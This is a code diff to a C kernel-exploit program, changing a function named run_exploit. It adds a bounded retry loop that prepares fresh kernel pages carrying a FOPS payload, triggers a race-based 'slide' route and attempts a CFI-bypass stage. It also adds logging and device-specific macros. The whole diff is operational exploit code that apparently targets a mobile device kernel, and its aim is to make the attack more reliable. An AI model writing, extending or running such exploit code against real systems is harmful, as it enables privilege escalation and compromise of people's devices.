@@ -683,6 +683,67 @@ int run_exploit(int argc, char **argv) {
   }
 #else
   start_p0_ref_keeper();
+#if defined(APP_FOPS_SINGLE_PATH_RETRY) && APP_FOPS_SINGLE_PATH_RETRY
+  /* EZIF-only lottery: the legacy single shot below wastes clean misses
+   * (verified=0, no dirty) that a fresh FOPS page could win. Mirror the
+   * fresh-session loop above: fresh prepare -> trigger -> try_cfi_stage;
+   * verified or dirty breaks immediately (dirty state is never retried).
+   * Bound reuses APP_FOPS_FRESH_PAGE_ATTEMPTS; without this macro the
+   * target falls through to the verbatim single shot in the #else below.
+   * No reset_pipe_attempt between attempts: that helper zeroes
+   * pipebuf_page_base without rebuilding it (cf. §9.10). */
+#ifdef APP_FOPS_FRESH_PAGE_ATTEMPTS
+  const int fops_single_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
+#else
+  const int fops_single_attempts = 1;
+#endif
+  for (int attempt = 1; attempt <= fops_single_attempts; attempt++) {
+    /* Per-iteration sentinel reset (same 0/0 convention as
+     * reset_main_route_state(), main.c:184-185): try_cfi_stage() only
+     * writes cfi_last_step/errno on paths it reaches, and a !triggered
+     * attempt never runs CFI at all, so without this the slide log below
+     * would print the previous attempt's stale step. */
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    if (attempt != 1) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base) {
+        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
+                   attempt, fops_single_attempts);
+        continue;
+      }
+    }
+    int triggered = app_trigger_fops_slide_route();
+#if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
+    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
+            attempt, triggered);
+#endif
+    int verified = triggered && try_cfi_stage();
+    if (!triggered) {
+      /* CFI not run (trigger failed): try_cfi_stage() was short-circuited,
+       * so the 0/0 sentinel above stands — log it explicitly instead of
+       * letting the slide line below read as a CFI verdict. */
+      pr_info("app fops CFI not run (trigger failed) attempt=%d/%d\n",
+              attempt, fops_single_attempts);
+    }
+    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
+            "step=%d errno=%d base=%016zx\n",
+            attempt, fops_single_attempts, triggered, verified,
+            cfi_last_step, cfi_last_errno, page_base);
+    if (verified || cfi_dirty_seen) {
+      break;
+    }
+    if (attempt < fops_single_attempts) {
+      pr_info("app fops clean miss; retrying with fresh FOPS page "
+              "attempt=%d/%d\n",
+              attempt, fops_single_attempts);
+    } else {
+      pr_info("app fops final clean miss, no further retry "
+              "attempt=%d/%d\n",
+              attempt, fops_single_attempts);
+    }
+  }
+#else
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
@@ -691,12 +752,14 @@ int run_exploit(int argc, char **argv) {
 #endif
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
-            "step=%d errno=%d\n",
-            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+            "step=%d errno=%d base=%016zx\n",
+            attempt, triggered, verified, cfi_last_step, cfi_last_errno,
+            page_base);
     if (verified || cfi_dirty_seen) {
       break;
     }
   }
+#endif
 #endif
 #endif
 #else
